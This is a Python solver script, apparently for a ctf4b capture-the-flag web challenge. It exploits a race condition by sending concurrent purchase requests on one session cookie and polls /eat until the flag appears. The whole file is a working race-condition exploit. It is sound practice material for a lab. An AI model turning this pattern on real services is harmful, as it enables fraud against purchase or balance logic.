import os
import requests
import threading

url = f"https://{os.getenv('CTF4B_HOST')}:{os.getenv('CTF4B_PORT')}/"

def rcexploit1(cookie):
    requests.post(url + "/buy_noodles", cookies = cookie, verify=False)

def rcexploit2(cookie):
    requests.post(url + "/buy_soup", cookies = cookie, verify=False)

def rc():
    session = requests.Session()
    response = session.get(url, verify=False)
    cookie = {"session": session.cookies.get("session")}

    th1 = threading.Thread(target=rcexploit1, args=(cookie,))
    th2 = threading.Thread(target=rcexploit1, args=(cookie,))
    th3 = threading.Thread(target=rcexploit2, args=(cookie,))
    th1.start()
    th2.start()
    th3.start()

    requests.post(url + "/buy_noodles", cookies = cookie, verify=False)
    requests.post(url + "/buy_noodles", cookies = cookie, verify=False)

    print(cookie)
    return (requests.get(url + "/eat", cookies = cookie, verify=False).text)

while True:
    flag = rc()
    if "ctf4b" in flag:
        print(flag)
        break